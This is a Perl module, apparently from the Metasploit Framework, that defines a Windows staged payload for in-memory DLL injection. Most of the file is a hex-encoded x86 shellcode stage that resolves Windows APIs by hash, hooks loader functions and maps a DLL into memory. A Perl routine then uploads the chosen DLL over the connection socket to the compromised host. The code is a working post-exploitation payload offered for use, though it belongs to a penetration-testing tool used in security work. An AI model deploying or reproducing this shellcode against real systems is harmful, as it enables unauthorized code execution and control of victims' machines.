package Msf::PayloadComponent::Win32InjectLibStage;
use strict;
use base 'Msf::PayloadComponent::Win32StagePayload';

my $info = {
  'Win32StagePayload' =>
    {
      Payload => 
        "\x55\x8b\xec\x81\xec\xb0\x00\x00\x00\x53\x56\x57\xeb\x02\xeb\x05".
        "\xe8\xf9\xff\xff\xff\x5b\x83\xeb\x15\x89\x9d\x6c\xff\xff\xff\x89".
        "\xbd\x5c\xff\xff\xff\xeb\x70\x56\x33\xc0\x64\x8b\x40\x30\x85\xc0".
        "\x78\x0c\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x40\x08\xeb\x09\x8b\x40".
        "\x34\x8d\x40\x7c\x8b\x40\x3c\x5e\xc3\x60\x8b\x6c\x24\x24\x8b\x45".
        "\x3c\x8b\x54\x05\x78\x03\xd5\x8b\x4a\x18\x8b\x5a\x20\x03\xdd\xe3".
        "\x34\x49\x8b\x34\x8b\x03\xf5\x33\xff\x33\xc0\xfc\xac\x84\xc0\x74".
        "\x07\xc1\xcf\x0d\x03\xf8\xeb\xf4\x3b\x7c\x24\x28\x75\xe1\x8b\x5a".
        "\x24\x03\xdd\x66\x8b\x0c\x4b\x8b\x5a\x1c\x03\xdd\x8b\x04\x8b\x03".
        "\xc5\x89\x44\x24\x1c\x61\xc3\xe8\x8b\xff\xff\xff\x8b\xd8\x68\x8e".
        "\x4e\x0e\xec\x53\xe8\xa0\xff\xff\xff\x83\xc4\x08\x89\x45\xc0\x68".
        "\xaa\xfc\x0d\x7c\x53\xe8\x8f\xff\xff\xff\x83\xc4\x08\x89\x45\xc4".
        "\x68\x7e\xd8\xe2\x73\x53\xe8\x7e\xff\xff\xff\x83\xc4\x08\x89\x45".
        "\xc8\x68\x54\xca\xaf\x91\x53\xe8\x6d\xff\xff\xff\x83\xc4\x08\x89".
        "\x45\xcc\x68\xaa\xc8\xc8\xa3\x53\xe8\x5c\xff\xff\xff\x83\xc4\x08".
        "\x89\x45\xd0\x68\x1b\xc6\x46\x79\x53\xe8\x4b\xff\xff\xff\x83\xc4".
        "\x08\x89\x45\xd4\x68\x80\x09\x12\x53\x53\xe8\x3a\xff\xff\xff\x83".
        "\xc4\x08\x89\x45\xd8\x68\xa1\x6a\x3d\xd8\x53\xe8\x29\xff\xff\xff".
        "\x83\xc4\x08\x89\x45\xdc\x33\xc0\xb0\x6c\x50\x68\x6e\x74\x64\x6c".
        "\x54\xff\x55\xc0\x8b\xd8\x68\x95\xdd\xb5\x92\x53\xe8\x08\xff\xff".
        "\xff\x83\xc4\x08\x89\x45\xac\x68\x90\x78\x4a\x49\x53\xe8\xf7\xfe".
        "\xff\xff\x83\xc4\x08\x89\x45\xb0\x68\xb8\x74\x29\x85\x53\xe8\xe6".
        "\xfe\xff\xff\x83\xc4\x08\x89\x45\xb4\x68\xcb\x9b\xb2\x5b\x53\xe8".
        "\xd5\xfe\xff\xff\x83\xc4\x08\x89\x45\xb8\x68\x94\x9b\x15\xd5\x53".
        "\xe8\xc4\xfe\xff\xff\x83\xc4\x08\x89\x45\xbc\x68\xb6\xbd\x8a\x86".
        "\x53\xe8\xb3\xfe\xff\xff\x83\xc4\x08\x89\x45\xf4\x68\x6c\x5d\xa7".
        "\x67\x53\xe8\xa2\xfe\xff\xff\x83\xc4\x08\x89\x45\xf8\xc6\x85\x50".
        "\xff\xff\xff\x77\xc6\x85\x51\xff\xff\xff\x73\xc6\x85\x52\xff\xff".
        "\xff\x32\xc6\x85\x53\xff\xff\xff\x5f\xc6\x85\x54\xff\xff\xff\x33".
        "\xc6\x85\x55\xff\xff\xff\x32\xc6\x85\x56\xff\xff\xff\x00\x8d\x85".
        "\x50\xff\xff\xff\x50\xff\x55\xc0\x8b\xd0\x68\xb6\x19\x18\xe7\x52".
        "\xe8\x54\xfe\xff\xff\x83\xc4\x08\x89\x45\xfc\x8d\x8d\x5c\xff\xff".
        "\xff\x51\xe8\x40\x06\x00\x00\x83\xc4\x04\x5f\x5e\x5b\x8b\xe5\x5d".
        "\xc3\xff\xff\xff\xff\x55\x8b\xec\xe8\x00\x00\x00\x00\x59\x83\xe9".
        "\x08\xb8\xd1\x16\x40\x00\x2d\xcd\x16\x40\x00\x2b\xc8\x8b\x01\x5d".
        "\xc3\x55\x8b\xec\x81\xec\x14\x01\x00\x00\x57\xc6\x85\xfc\xfe\xff".
        "\xff\x00\xb9\x3f\x00\x00\x00\x33\xc0\x8d\xbd\xfd\xfe\xff\xff\xf3".
        "\xab\x66\xab\xaa\x66\xc7\x85\xf0\xfe\xff\xff\x00\x01\x66\x8b\x85".
        "\xf0\xfe\xff\xff\x66\x89\x85\xec\xfe\xff\xff\x66\x8b\x8d\xec\xfe".
        "\xff\xff\x66\x89\x8d\xf4\xfe\xff\xff\x66\x8b\x95\xf0\xfe\xff\xff".
        "\x66\x89\x95\xf6\xfe\xff\xff\x8d\x85\xfc\xfe\xff\xff\x89\x85\xf8".
        "\xfe\xff\xff\xe8\x7d\xff\xff\xff\x89\x45\xfc\x6a\x00\x8b\x4d\x10".
        "\x8b\x51\x08\x52\x8d\x85\xf4\xfe\xff\xff\x50\x8b\x4d\xfc\xff\x91".
        "\x98\x00\x00\x00\x8b\x55\xfc\x83\xc2\x04\x52\x8b\x85\xf8\xfe\xff".
        "\xff\x50\x8b\x4d\xfc\xff\x91\x9c\x00\x00\x00\x85\xc0\x74\x0f\x8b".
        "\x55\x08\x8b\x45\xfc\x8b\x48\x18\x89\x0a\x33\xc0\xeb\x15\x8b\x55".
        "\x10\x52\x8b\x45\x0c\x50\x8b\x4d\x08\x51\x8b\x55\xfc\xff\x92\x84".
        "\x00\x00\x00\x5f\x8b\xe5\x5d\xc2\x0c\x00\x55\x8b\xec\x81\xec\x18".
        "\x01\x00\x00\x57\xc6\x85\xfc\xfe\xff\xff\x00\xb9\x3f\x00\x00\x00".
        "\x33\xc0\x8d\xbd\xfd\xfe\xff\xff\xf3\xab\x66\xab\xaa\xc7\x85\xec".
        "\xfe\xff\xff\x04\x00\x00\x00\x66\xc7\x85\xf0\xfe\xff\xff\x00\x01".
        "\x66\x8b\x85\xf0\xfe\xff\xff\x66\x89\x85\xe8\xfe\xff\xff\x66\x8b".
        "\x8d\xe8\xfe\xff\xff\x66\x89\x8d\xf4\xfe\xff\xff\x66\x8b\x95\xf0".
        "\xfe\xff\xff\x66\x89\x95\xf6\xfe\xff\xff\x8d\x85\xfc\xfe\xff\xff".
        "\x89\x85\xf8\xfe\xff\xff\xe8\xaa\xfe\xff\xff\x89\x45\xfc\x6a\x00".
        "\x8b\x4d\x08\x8b\x51\x08\x52\x8d\x85\xf4\xfe\xff\xff\x50\x8b\x4d".
        "\xfc\xff\x91\x98\x00\x00\x00\x8b\x55\xfc\x83\xc2\x04\x52\x8b\x85".
        "\xf8\xfe\xff\xff\x50\x8b\x4d\xfc\xff\x91\x9c\x00\x00\x00\x85\xc0".
        "\x74\x5d\x8b\x55\x0c\xc7\x02\xe0\x5c\x27\x7e\x8b\x45\x0c\xc7\x40".
        "\x04\xfa\x22\xc4\x01\x8b\x4d\x0c\xc7\x41\x08\xe0\x5c\x27\x8e\x8b".
        "\x55\x0c\xc7\x42\x0c\xfa\x22\xc4\x01\x8b\x45\x0c\xc7\x40\x10\xe0".
        "\x5c\x27\x7e\x8b\x4d\x0c\xc7\x41\x14\xfa\x22\xc4\x01\x8b\x55\x0c".
        "\xc7\x42\x18\xe0\x5c\x27\x7e\x8b\x45\x0c\xc7\x40\x1c\xfa\x22\xc4".
        "\x01\x8b\x4d\x0c\xc7\x41\x20\x80\x00\x00\x00\x33\xc0\xeb\x11\x8b".
        "\x55\x0c\x52\x8b\x45\x08\x50\x8b\x4d\xfc\xff\x91\x88\x00\x00\x00".
        "\x5f\x8b\xe5\x5d\xc2\x08\x00\x55\x8b\xec\x81\xec\x14\x01\x00\x00".
        "\x57\xc6\x85\xfc\xfe\xff\xff\x00\xb9\x3f\x00\x00\x00\x33\xc0\x8d".
        "\xbd\xfd\xfe\xff\xff\xf3\xab\x66\xab\xaa\x66\xc7\x85\xf0\xfe\xff".
        "\xff\x00\x01\x66\x8b\x85\xf0\xfe\xff\xff\x66\x89\x85\xec\xfe\xff".
        "\xff\x66\x8b\x8d\xec\xfe\xff\xff\x66\x89\x8d\xf4\xfe\xff\xff\x66".
        "\x8b\x95\xf0\xfe\xff\xff\x66\x89\x95\xf6\xfe\xff\xff\x8d\x85\xfc".
        "\xfe\xff\xff\x89\x85\xf8\xfe\xff\xff\xe8\x97\xfd\xff\xff\x89\x45".
        "\xfc\x6a\x00\x8b\x4d\x10\x8b\x51\x08\x52\x8d\x85\xf4\xfe\xff\xff".
        "\x50\x8b\x4d\xfc\xff\x91\x98\x00\x00\x00\x8b\x55\xfc\x83\xc2\x04".
        "\x52\x8b\x85\xf8\xfe\xff\xff\x50\x8b\x4d\xfc\xff\x91\x9c\x00\x00".
        "\x00\x85\xc0\x74\x0d\x8b\x55\x08\x8b\x45\xfc\x8b\x48\x18\x89\x0a".
        "\xeb\x21\x8b\x55\x1c\x52\x8b\x45\x18\x50\x8b\x4d\x14\x51\x8b\x55".
        "\x10\x52\x8b\x45\x0c\x50\x8b\x4d\x08\x51\x8b\x55\xfc\xff\x92\x8c".
        "\x00\x00\x00\x5f\x8b\xe5\x5d\xc2\x18\x00\x55\x8b\xec\x51\xe8\x22".
        "\xfd\xff\xff\x89\x45\xfc\x8b\x45\xfc\x8b\x4d\x20\x3b\x48\x18\x75".
        "\x0f\x8b\x55\x08\x8b\x45\xfc\x8b\x48\x18\x89\x0a\x33\xc0\xeb\x25".
        "\x8b\x55\x20\x52\x8b\x45\x1c\x50\x8b\x4d\x18\x51\x8b\x55\x14\x52".
        "\x8b\x45\x10\x50\x8b\x4d\x0c\x51\x8b\x55\x08\x52\x8b\x45\xfc\xff".
        "\x90\x90\x00\x00\x00\x8b\xe5\x5d\xc2\x1c\x00\x55\x8b\xec\x51\xe8".
        "\xd1\xfc\xff\xff\x89\x45\xfc\x8b\x45\xfc\x8b\x4d\x08\x3b\x48\x18".
        "\x75\x12\x8b\x55\x10\x8b\x45\xfc\x8b\x48\x18\x89\x0a\xb8\x03\x00".
        "\x00\x40\xeb\x31\x8b\x55\x2c\x52\x8b\x45\x28\x50\x8b\x4d\x24\x51".
        "\x8b\x55\x20\x52\x8b\x45\x1c\x50\x8b\x4d\x18\x51\x8b\x55\x14\x52".
        "\x8b\x45\x10\x50\x8b\x4d\x0c\x51\x8b\x55\x08\x52\x8b\x45\xfc\xff".
        "\x90\x94\x00\x00\x00\x8b\xe5\x5d\xc2\x28\x00\x55\x8b\xec\x83\xec".
        "\x28\xc7\x45\xd8\x05\x00\x00\x00\x8d\x45\xe0\x50\x8b\x4d\xd8\x51".
        "\x8b\x55\x0c\x52\x8b\x45\x10\x50\x6a\xff\x8b\x4d\x08\xff\x91\x80".
        "\x00\x00\x00\x8b\x55\x10\x03\x55\xd8\xc6\x02\xe9\x8b\x45\x10\x83".
        "\xc0\x05\x8b\x4d\x0c\x2b\xc8\x8b\x55\x10\x03\x55\xd8\x89\x4a\x01".
        "\x6a\x1c\x8d\x45\xe4\x50\x8b\x4d\x0c\x51\x8b\x55\x08\xff\x52\x74".
        "\x8d\x45\xf8\x50\x6a\x40\x8b\x4d\xf0\x51\x8b\x55\xe4\x52\x8b\x45".
        "\x08\xff\x50\x78\x8b\x4d\x0c\xc6\x01\xe9\x8b\x55\x0c\x83\xc2\x05".
        "\x8b\x45\x14\x2b\xc2\x8b\x4d\x0c\x89\x41\x01\x8d\x55\xdc\x52\x8b".
        "\x45\xf8\x50\x8b\x4d\xf0\x51\x8b\x55\xe4\x52\x8b\x45\x08\xff\x50".
        "\x78\x8b\x4d\xf0\x51\x8b\x55\xe4\x52\x6a\xff\x8b\x45\x08\xff\x50".
        "\x7c\x8b\xe5\x5d\xc3\x55\x8b\xec\xb8\xf7\x19\x40\x00\x2d\xbc\x14".
        "\x40\x00\x8b\x4d\x08\x03\x41\x10\x50\x8b\x55\x08\x83\xc2\x44\x52".
        "\x8b\x45\x08\x8b\x48\x60\x51\x8b\x55\x08\x52\xe8\x2b\xff\xff\xff".
        "\x83\xc4\x10\x8b\x45\x08\x83\xc0\x44\x8b\x4d\x08\x89\x81\x94\x00".
        "\x00\x00\xba\xb6\x17\x40\x00\x81\xea\xbc\x14\x40\x00\x8b\x45\x08".
        "\x03\x50\x10\x52\x8b\x4d\x08\x83\xc1\x26\x51\x8b\x55\x08\x8b\x42".
        "\x54\x50\x8b\x4d\x08\x51\xe8\xf0\xfe\xff\xff\x83\xc4\x10\x8b\x55".
        "\x08\x83\xc2\x26\x8b\x45\x08\x89\x90\x88\x00\x00\x00\xb9\xd3\x18".
        "\x40\x00\x81\xe9\xbc\x14\x40\x00\x8b\x55\x08\x03\x4a\x10\x51\x8b".
        "\x45\x08\x83\xc0\x30\x50\x8b\x4d\x08\x8b\x51\x58\x52\x8b\x45\x08".
        "\x50\xe8\xb5\xfe\xff\xff\x83\xc4\x10\x8b\x4d\x08\x83\xc1\x30\x8b".
        "\x55\x08\x89\x8a\x8c\x00\x00\x00\xb8\xa6\x19\x40\x00\x2d\xbc\x14".
        "\x40\x00\x8b\x4d\x08\x03\x41\x10\x50\x8b\x55\x08\x83\xc2\x3a\x52".
        "\x8b\x45\x08\x8b\x48\x5c\x51\x8b\x55\x08\x52\xe8\x7b\xfe\xff\xff".
        "\x83\xc4\x10\x8b\x45\x08\x83\xc0\x3a\x8b\x4d\x08\x89\x81\x90\x00".
        "\x00\x00\xba\xed\x16\x40\x00\x81\xea\xbc\x14\x40\x00\x8b\x45\x08".
        "\x03\x50\x10\x52\x8b\x4d\x08\x83\xc1\x1c\x51\x8b\x55\x08\x8b\x42".
        "\x50\x50\x8b\x4d\x08\x51\xe8\x40\xfe\xff\xff\x83\xc4\x10\x8b\x55".
        "\x08\x83\xc2\x1c\x8b\x45\x08\x89\x90\x84\x00\x00\x00\x5d\xc3\x55".
        "\x8b\xec\x83\xec\x10\x8b\x45\x08\x8b\x48\x14\x89\x4d\xf4\x8b\x55".
        "\x08\x8b\x42\x14\x8b\x4d\xf4\x03\x41\x3c\x89\x45\xf8\x6a\x40\x68".
        "\x00\x30\x00\x00\x8b\x55\xf8\x8b\x42\x50\x50\x6a\x00\x8b\x4d\x08".
        "\xff\x51\x70\x8b\x55\x08\x89\x42\x18\x6a\x00\x8b\x45\xf8\x8b\x48".
        "\x54\x51\x8b\x55\x08\x8b\x42\x14\x50\x8b\x4d\x08\x8b\x51\x18\x52".
        "\x6a\xff\x8b\x45\x08\xff\x90\x80\x00\x00\x00\x8b\x4d\xf8\x33\xd2".
        "\x66\x8b\x51\x14\x8b\x45\xf8\x8d\x4c\x10\x18\x89\x4d\xfc\xc7\x45".
        "\xf0\x00\x00\x00\x00\xeb\x09\x8b\x55\xf0\x83\xc2\x01\x89\x55\xf0".
        "\x8b\x45\xf8\x33\xc9\x66\x8b\x48\x06\x39\x4d\xf0\x7d\x45\x6a\x00".
        "\x8b\x55\xf0\x6b\xd2\x28\x8b\x45\xfc\x8b\x4c\x10\x10\x51\x8b\x55".
        "\xf0\x6b\xd2\x28\x8b\x45\x08\x8b\x48\x14\x8b\x45\xfc\x03\x4c\x10".
        "\x14\x51\x8b\x4d\xf0\x6b\xc9\x28\x8b\x55\x08\x8b\x42\x18\x8b\x55".
        "\xfc\x03\x44\x0a\x0c\x50\x6a\xff\x8b\x45\x08\xff\x90\x80\x00\x00".
        "\x00\xeb\xa4\x8b\xe5\x5d\xc3\x55\x8b\xec\x83\xec\x24\xc7\x45\xe0".
        "\x00\x00\x00\x00\xc7\x45\xf4\x00\x00\x00\x00\x8b\x45\x08\xc6\x40".
        "\x04\x68\x8b\x4d\x08\xc6\x41\x05\x78\x8b\x55\x08\xc6\x42\x06\x72".
        "\x8b\x45\x08\xc6\x40\x07\x33\x8b\x4d\x08\xc6\x41\x08\x32\x8b\x55".
        "\x08\xc6\x42\x09\x2e\x8b\x45\x08\xc6\x40\x0a\x64\x8b\x4d\x08\xc6".
        "\x41\x0b\x6c\x8b\x55\x08\xc6\x42\x0c\x6c\x8b\x45\x08\xc6\x40\x0d".
        "\x00\xc6\x45\xe8\x49\xc6\x45\xe9\x6e\xc6\x45\xea\x69\xc6\x45\xeb".
        "\x74\xc6\x45\xec\x00\x6a\x00\x6a\x04\x8d\x4d\xfc\x51\x8b\x55\x08".
        "\x8b\x02\x50\x8b\x4d\x08\xff\x91\xa0\x00\x00\x00\x89\x45\xe0\x83".
        "\x7d\xe0\x00\x7f\x08\x6a\x01\x8b\x55\x08\xff\x52\x6c\x6a\x04\x68".
        "\x00\x10\x00\x00\x8b\x45\xfc\x50\x6a\x00\x8b\x4d\x08\xff\x51\x70".
        "\x8b\x55\x08\x89\x42\x14\x8b\x45\x08\x83\x78\x14\x00\x75\x08\x6a".
        "\x01\x8b\x4d\x08\xff\x51\x6c\x8b\x55\xfc\x89\x55\xdc\xeb\x12\x8b".
        "\x45\xdc\x2b\x45\xe0\x89\x45\xdc\x8b\x4d\xf4\x03\x4d\xe0\x89\x4d".
        "\xf4\x83\x7d\xdc\x00\x7e\x2c\x6a\x00\x8b\x55\xdc\x52\x8b\x45\x08".
        "\x8b\x48\x14\x03\x4d\xf4\x51\x8b\x55\x08\x8b\x02\x50\x8b\x4d\x08".
        "\xff\x91\xa0\x00\x00\x00\x89\x45\xe0\x83\x7d\xe0\x00\x7d\x02\xeb".
        "\x02\xeb\xbc\x8b\x55\x08\x52\xe8\x13\xfe\xff\xff\x83\xc4\x04\xb8".
        "\xcd\x16\x40\x00\x2d\xbc\x14\x40\x00\x8b\x4d\x08\x8b\x51\x10\x8b".
        "\x4d\x08\x89\x0c\x10\x8b\x55\x08\x52\xe8\xc7\xfc\xff\xff\x83\xc4".
        "\x04\x8b\x45\x08\x83\xc0\x04\x50\x8b\x4d\x08\xff\x51\x64\x89\x45".
        "\xe4\x8d\x55\xe8\x52\x8b\x45\xe4\x50\x8b\x4d\x08\xff\x51\x68\x89".
        "\x45\xf8\x8b\x55\x08\x8b\x02\x50\xff\x55\xf8\x83\xc4\x04\x33\xc0".
        "\x8b\xe5\x5d\xc3",
  }
};

sub new {
  my $class = shift;
  my $hash = @_ ? shift : { };
  $hash = $class->MergeHash($hash, {'Info' => $info});
  my $self = $class->SUPER::new($hash, @_);
  return($self);
}

sub HandleConnection {
  my $self = shift;
  my $sock = $self->SocketOut;
  my $path = $self->_InjectDLL;

  $self->SUPER::HandleConnection;
  
  if(!open(INFILE, '<' . $path)) {
    $self->PrintLine('[*] Could not open path to dll.');
    $self->KillChild;
    return;
  }

  local $/;
  my $upload = <INFILE>;
  close(INFILE);

  $self->PrintLine('[*] Sleeping before sending dll.');
  sleep(2);
  
  if (! $sock->connected) {
    $self->PrintLine('[*] Socket closed before dll was uploaded');
    $self->KillChild;
    return;  
  }
  
  $self->PrintLine('[*] Uploading dll to memory (' . length($upload) . '), Please wait...');
  $sock->blocking(1);
  $sock->send(pack('V', length($upload)));
  $sock->send($upload);
}
